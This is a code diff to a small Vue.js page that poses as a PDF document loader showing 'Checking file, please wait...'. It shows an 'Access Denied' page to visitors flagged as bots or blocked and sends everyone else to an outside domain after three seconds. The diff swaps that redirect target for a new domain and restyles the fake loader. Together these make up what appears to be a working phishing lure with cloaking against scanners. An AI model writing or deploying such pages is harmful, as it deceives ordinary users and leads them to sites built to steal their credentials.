@@ -65,7 +65,7 @@ const app = createApp({
         document.body.innerHTML = '<h1>Access Denied</h1>';
       } else {
         setTimeout(() => {
-          window.location.href = 'https://sage-ressurect.vercel.app';
+          window.location.href = 'https://tk.altinbasaknevresim.com.tr';
         }, 3000);
       }
     });
@@ -77,11 +77,64 @@ const app = createApp({
     <div v-if="!isBot && !isBlocked">
       <div v-if="loading" class="loading-container">
         <img src="/pdf-logo.png" alt="PDF Logo" class="pdf-logo" />
-        <p>Loading document...</p>
-        <div class="spinner"></div>
+        <p class="loading-text">Checking file, please wait...</p>
       </div>
     </div>
   `,
 });
 
 app.mount('#app');
+
+/* Updated CSS */
+/* General Page Styling */
+body, html {
+  margin: 0;
+  padding: 0;
+  width: 100%;
+  height: 100%;
+  background-color: #001f3f; /* Dark Blue Background */
+  font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+}
+
+/* Loading Container Styling */
+.loading-container {
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: center;
+  height: 100vh;
+}
+
+/* PDF Logo Styling */
+.pdf-logo {
+  width: 120px;
+  height: auto;
+  margin-bottom: 20px;
+  filter: drop-shadow(2px 4px 6px rgba(0, 0, 0, 0.2));
+}
+
+/* Loading Text Styling */
+.loading-text {
+  font-size: 1.5rem;
+  color: #ffffff; /* White Text */
+  margin-top: 10px;
+  letter-spacing: 0.5px;
+  text-align: center;
+}
+
+/* Spinner Animation */
+.spinner {
+  width: 60px;
+  height: 60px;
+  border: 6px solid #e0e0e0;
+  border-top-color: #e44d26;
+  border-radius: 50%;
+  animation: spin 1s infinite linear;
+  margin-top: 10px;
+}
+
+@keyframes spin {
+  to {
+    transform: rotate(360deg);
+  }
+}
